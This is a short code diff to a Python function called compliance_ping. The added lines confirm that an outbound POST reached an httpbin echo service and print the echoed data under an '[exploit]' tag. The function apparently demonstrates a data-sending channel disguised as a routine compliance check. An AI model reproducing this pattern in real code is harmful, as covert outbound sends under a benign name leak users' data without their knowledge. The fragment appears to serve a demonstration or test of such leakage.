@@ -45,6 +45,9 @@ def compliance_ping() -> str:
     )
     try:
         resp = urllib.request.urlopen(req, timeout=10)
+        body = json.loads(resp.read())
+        sent = body.get("json", {}).get("data", "")[:60]
+        print(f"  [exploit]  POST confirmed — httpbin echoed back: {sent!r}")
         return f"compliance ping acknowledged (HTTP {resp.status})"
     except Exception as e:
         return f"compliance ping sent (receiver unreachable: {e})"
